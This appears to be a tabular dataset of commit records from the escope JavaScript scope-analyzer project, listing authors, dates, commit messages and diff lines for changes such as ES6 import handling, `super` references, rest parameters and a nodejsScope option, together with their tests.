17,56,56,569,4,26,Fabricio C Zuardi,285,52,111,51,User,1,4127,Mon,18,8,9 Mar 2015,change the referencer to support import declarations as described in the ESTree spec (fixes #51),0,0,2,22,870,"+// https://github.com/estree/estree/blob/master/es6.md#importdeclaration<\n>+        node.local = (node.local || node.id);<\n>+        if (node.local) {<\n>+            this.visitImport(node.local<c> node);<\n>+        node.local = (node.local || node.id);<\n>+        this.visitImport(node.local<c> node);<\n>+        node.local = (node.local || node.id);<\n>+            this.visitImport(node.local<c> node);<\n>+harmony = require '../third_party/espree'<\n>+        ast = harmony """"""<\n>+        ast = harmony """"""<\n>+        ast = harmony """"""<\n>+        ast = harmony """"""<\n>","-        if (node.id) {<\n>-            this.visitImport(node.id<c> node);<\n>-        this.visitImport(node.id<c> node);<\n>-            this.visitImport(node.id<c> node);<\n>-harmony = require '../third_party/esprima'<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,4,52,10 Mar 2015,Handle `super` like `this` Close #50,0,1,1,74,3667,"+        if (!node || node.type !== Syntax.Identifier) {<\n>+            return;<\n>+        }<\n>+        // Specially handle like `this`.<\n>+        if (node.name === 'super') {<\n>+            return;<\n>+        let ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>+        this.references.push(ref);<\n>+        this.__left.push(ref);<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 super'<c> -><\n>+    it 'is not handled as reference'<c> -><\n>+        ast = harmony.parse """"""<\n>+        class Hello {<\n>+            constructor() {<\n>+                super();<\n>+            }<\n>+            method() {<\n>+                super.method();<\n>+            }<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'Hello'<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'class'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'Hello'<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0  # super is specially handled like `this`.<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0  # super is specially handled like `this`.<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        var ref;<\n>-        if (node && node.type === Syntax.Identifier) {<\n>-            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>-            this.references.push(ref);<\n>-            this.__left.push(ref);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,4,51,10 Mar 2015,Add espree parser for import/export declarations tests,0,1,1,87,4242,"+    ""espree"": ""^1.11.0""<c><\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+var espree = require('espree');<\n>+module.exports = function (code) {<\n>+    return espree.parse(code<c> {<\n>+        // attach range information to each node<\n>+        range: true<c><\n>+        // attach line/column location information to each node<\n>+        loc: true<c><\n>+        // create a top-level comments array containing all comments<\n>+        comments: true<c><\n>+        // attach comments to the closest relevant node as leadingComments and<\n>+        // trailingComments<\n>+        attachComment: true<c><\n>+        // create a top-level tokens array containing all tokens<\n>+        tokens: true<c><\n>+        // try to continue parsing if an error is encountered<c> store errors in a<\n>+        // top-level errors array<\n>+        tolerant: true<c><\n>+        // specify parsing features (default only has blockBindings: true)<\n>+        ecmaFeatures: {<\n>+            // enable parsing of arrow functions<\n>+            arrowFunctions: true<c><\n>+            // enable parsing of let/const<\n>+            blockBindings: true<c><\n>+            // enable parsing of destructured arrays and objects<\n>+            destructuring: true<c><\n>+            // enable parsing of regular expression y flag<\n>+            regexYFlag: true<c><\n>+            // enable parsing of regular expression u flag<\n>+            regexUFlag: true<c><\n>+            // enable parsing of template strings<\n>+            templateStrings: true<c><\n>+            // enable parsing of binary literals<\n>+            binaryLiterals: true<c><\n>+            // enable parsing of ES6 octal literals<\n>+            octalLiterals: true<c><\n>+            // enable parsing unicode code point escape sequences<\n>+            unicodeCodePointEscapes: true<c><\n>+            // enable parsing of default parameters<\n>+            defaultParams: true<c><\n>+            // enable parsing of rest parameters<\n>+            restParams: true<c><\n>+            // enable parsing of for-of statement<\n>+            forOf: true<c><\n>+            // enable parsing computed object literal properties<\n>+            objectLiteralComputedProperties: true<c><\n>+            // enable parsing of shorthand object literal methods<\n>+            objectLiteralShorthandMethods: true<c><\n>+            // enable parsing of shorthand object literal properties<\n>+            objectLiteralShorthandProperties: true<c><\n>+            // Allow duplicate object literal properties (except '__proto__')<\n>+            objectLiteralDuplicateProperties: true<c><\n>+            // enable parsing of generators/yield<\n>+            generators: true<c><\n>+            // enable parsing spread operator<\n>+            spread: true<c><\n>+            // enable parsing classes<\n>+            classes: true<c><\n>+            // enable parsing of modules<\n>+            modules: true<c><\n>+            // enable React JSX parsing<\n>+            jsx: true<c><\n>+            // enable return in global scope<\n>+            globalReturn: true<\n>+        }<\n>+    });<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,4,31,10 Mar 2015,Fixed estraverse ^1.9.1 until all estree fix are landed,0,0,1,2,57,"+    ""estraverse"": ""^1.9.1""<\n>","-    ""estraverse"": "">=1.9.1""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,0,6,9 Mar 2015,Ensure class name is declarated in global scope ref #49,0,0,1,21,885,"+    it 'regression #49'<c> -><\n>+        ast = harmony.parse """"""<\n>+        class Shoe {<\n>+            constructor() {<\n>+                //Shoe.x = true;<\n>+            }<\n>+        }<\n>+        let shoe = new Shoe();<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'Shoe'<\n>+        expect(scope.variables[1].name).to.be.equal 'shoe'<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'shoe'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'Shoe'<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,7,28,7 Mar 2015,Implement nodejsScope option Close #43,0,1,5,91,4607,"+        nodejsScope: false<c><\n>+ * @param {boolean} [providedOptions.nodejsScope=false]- whether the whole<\n>+ * script is executed under node.js environment. When enabled<c> escope adds<\n>+ * a function scope immediately following the global scope.<\n>+        if (this.scopeManager.__isNodejsScope()) {<\n>+            // Force strictness of GlobalScope to false when using node.js scope.<\n>+            this.currentScope().isStrict = false;<\n>+            this.scopeManager.__nestFunctionScope(node<c> false);<\n>+        }<\n>+    __isNodejsScope() {<\n>+        return this.__options.nodejsScope;<\n>+    }<\n>+        if (block.type === 'Program') {<\n>+            body = block;<\n>+        } else {<\n>+            body = block.body;<\n>+        }<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.isStrict).to.be.true<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'nodejsScope option'<c> -><\n>+    it 'creates a function scope following the global scope immediately'<c> -><\n>+        ast = harmony.parse """"""<\n>+        'use strict';<\n>+        var hello = 20;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> nodejsScope: yes<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.true<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'hello'<\n>+    it 'creates a function scope following the global scope immediately and creates module scope'<c> -><\n>+        ast = harmony.parse """"""<\n>+        import {x as v} from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> nodejsScope: yes<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'v'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'ImportBinding'<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        body = block.body;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,6,52,7 Mar 2015,Update dependencies,0,0,1,12,340,"+    ""browserify"": ""^9.0.3""<c><\n>+    ""chai"": ""^2.1.1""<c><\n>+    ""coffee-script"": ""^1.9.1""<c><\n>+    ""gulp-bump"": ""^0.2.2""<c><\n>+    ""gulp-eslint"": ""^0.5.0""<c><\n>+    ""gulp-git"": ""^1.0.1""<c><\n>","-    ""browserify"": ""^7.0.0""<c><\n>-    ""chai"": ""~1.10.0""<c><\n>-    ""coffee-script"": ""~1.8.0""<c><\n>-    ""gulp-bump"": ""^0.1.11""<c><\n>-    ""gulp-eslint"": ""^0.2.0""<c><\n>-    ""gulp-git"": ""^0.5.5""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,5,43,7 Mar 2015,Update CONTRIBUTING.md,0,0,1,8,817,+## Project license:  \<BSD-2-Clause\><\n>+- You will only Submit Contributions where You have authored 100% of the content.<\n>+- You will only Submit Contributions to which You have the necessary rights. This means that if You are employed You have received the necessary permissions from Your employer to make the Contributions.<\n>+- Whatever content You Contribute will be provided under the Project License.<\n>,-Project license(s):  <BSD-2-Clause><\n>-·  You will only Submit Contributions where You have authored 100% of the content.<\n>-·  You will only Submit Contributions to which You have the necessary rights. This means that if You are employed You have received the necessary permissions from Your employer to make the Contributions.<\n>-·  Whatever content You Contribute will be provided under the Project License(s).<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,5,41,7 Mar 2015,Add CONTRIBUTING.md,0,1,1,4,412,+Project license(s):  <BSD-2-Clause><\n>+·  You will only Submit Contributions where You have authored 100% of the content.<\n>+·  You will only Submit Contributions to which You have the necessary rights. This means that if You are employed You have received the necessary permissions from Your employer to make the Contributions.<\n>+·  Whatever content You Contribute will be provided under the Project License(s).<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,5,16,1 Mar 2015,Introduce ParameterDefinition And it saves whether this definition is a part of rest parameter.,0,0,4,36,1349,+import Variable from './variable';<\n>+/**<\n>+ * @class ParameterDefinition<\n>+ */<\n>+class ParameterDefinition extends Definition {<\n>+    constructor(name<c> node<c> index<c> rest) {<\n>+        super(Variable.Parameter<c> name<c> node<c> null<c> index<c> null);<\n>+        /**<\n>+         * Whether the parameter definition is a part of a rest parameter.<\n>+         * @member {boolean} ParameterDefinition#rest<\n>+         */<\n>+        this.rest = rest;<\n>+    }<\n>+export {<\n>+    ParameterDefinition<c><\n>+    Definition<\n>+import { ParameterDefinition<c> Definition } from './definition';<\n>+                    new ParameterDefinition(<\n>+                        false<\n>+                    new ParameterDefinition(<\n>+                        node.params.length<c><\n>+                        true<\n>+        expect(scope.variables[3].defs[0].rest).to.be.false<\n>+        expect(scope.variables[4].defs[0].rest).to.be.true<\n>+        expect(scope.variables[1].defs[0].name.name).to.be.equal 'bar'<\n>+        expect(scope.variables[1].defs[0].rest).to.be.true<\n>,-import Definition from './definition';<\n>-                    new Definition(<\n>-                        Variable.Parameter<c><\n>-                        null<c><\n>-                        null<\n>-                    new Definition(<\n>-                        Variable.Parameter<c><\n>-                        null<c><\n>-                        i<c><\n>-                        null<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,50,1 Mar 2015,Use babel instead of 6to5,0,0,2,6,160,"+    babel = require('gulp-babel')<c><\n>+    .pipe(babel)<\n>+    ""gulp-babel"": ""^4.0.0""<c><\n>","-    to5 = require('gulp-6to5')<c><\n>-    .pipe(to5)<\n>-    ""gulp-6to5"": ""^2.0.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,46,1 Mar 2015,Merge pull request #48 from estools/issue47 Fix: Ensure escope honors rest args (fixes #47),0,0,0,0,0,,,F
17,56,56,569,4,26,Nicholas C. Zakas,45,52,7470,0,User,0,3764,Sat,9,7,28 Feb 2015,Fix: Ensure escope honors rest args (fixes #47),0,1,2,62,2977,"+        // if there's a rest argument<c> add that<\n>+        if (node.rest) {<\n>+            this.visitPattern(node.rest<c> (pattern) => {<\n>+                this.currentScope().__define(pattern<c><\n>+                    new Definition(<\n>+                        Variable.Parameter<c><\n>+                        pattern<c><\n>+                        node<c><\n>+                        null<c><\n>+                        i<c><\n>+                        null<\n>+                    ));<\n>+            });<\n>+        }<\n>+        expect(scope.variables).to.have.length 5<\n>+        expect(scope.variables[4].name).to.be.equal 'rest2'<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 rest arguments'<c> -><\n>+    it 'materialize rest argument in scope'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo(...bar) {<\n>+            return bar;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'bar'<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        expect(scope.variables).to.have.length 4<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,7,26,8 Feb 2015,Merge pull request #46 from kevinb7/master added an example to README.md,0,0,0,0,0,,,F
17,56,56,569,4,26,Kevin Barabash,136,5,74,8,User,1,2772,Mon,18,51,2 Feb 2015,fixed the example so that currentScope is changed so that the current node isnt included in the currentScope when doing stuff,0,0,1,8,156,+            // do stuff<\n>+            <\n>+            <\n>+            // do stuff<\n>,-            <\n>-            // do stuff<\n>-            // do stuff<\n>-            <\n>,F
17,56,56,569,4,26,Kevin Barabash,136,5,74,8,User,1,2772,Mon,18,12,2 Feb 2015,added an example to README.md,0,0,1,25,811,+### Example<\n>+    var escope = require('escope');<\n>+    var esprima = require('esprima');<\n>+    var estraverse = require('estraverse');<\n>+    <\n>+    var ast = esprima.parse(code);<\n>+    var scopeManager = escope.analyze(ast);<\n>+    <\n>+    var currentScope = scopeManager.acquire(ast);   // global scope<\n>+    estraverse.traverse(ast<c> {<\n>+        enter: function(node<c> parent) {<\n>+            if (/Function/.test(node.type)) {<\n>+                currentScope = scopeManager.acquire(node);  // get current function scope<\n>+            }<\n>+            <\n>+            // do stuff<\n>+        }<c><\n>+        leave: function(node<c> parent) {<\n>+            // do stuff<\n>+            <\n>+            if (/Function/.test(node.type)) {<\n>+                currentScope = currentScope.upper;  // set to parent scope<\n>+            }<\n>+        }<\n>+    });<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,18,13,1 Feb 2015,Merge pull request #44 from estools/labelcheck Fix: Labeled statement ref counting (refs #33),0,0,0,0,0,,,F
17,56,56,569,4,26,Nicholas C. Zakas,45,52,7470,0,User,0,3764,Sat,12,49,31 Jan 2015,Fix: Labeled statement ref counting (refs #33),0,0,2,21,877,"+    LabeledStatement(node) {<\n>+        this.visit(node.body);<\n>+    }<\n>+    it 'should count child node references'<c> -><\n>+            ast = esprima.parse """"""<\n>+            var foo = 5;<\n>+            label: while (true) {<\n>+              console.log(foo);<\n>+              break;<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<\n>+            expect(scopeManager.scopes).to.have.length 1<\n>+            globalScope = scopeManager.scopes[0]<\n>+            expect(globalScope.type).to.be.equal 'global'<\n>+            expect(globalScope.variables).to.have.length 1<\n>+            expect(globalScope.variables[0].name).to.be.equal 'foo'<\n>+            expect(globalScope.through.length).to.be.equal 3<\n>+            expect(globalScope.through[2].identifier.name).to.be.equal 'foo'<\n>+            expect(globalScope.through[2].isRead()).to.be.true<\n>",-    LabeledStatement() {}<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,15,19,18 Jan 2015,Increments creates reference with read/write ref #33,0,1,1,41,2132,"+        if (isPattern(node.argument)) {<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esprima = require 'esprima'<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'global increment'<c> -><\n>+    it 'becomes read/write'<c> -><\n>+        ast = esprima.parse """"""<\n>+        b++;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<\n>+        expect(scopeManager.scopes).to.have.length 1<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 1<\n>+        expect(globalScope.references[0].isReadWrite()).to.be.true<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        if (isPattern(node)) {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,47,11 Jan 2015,LabeledStatement should not generate the reference ref #33,0,1,1,47,2465,"+    LabeledStatement() {}<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING 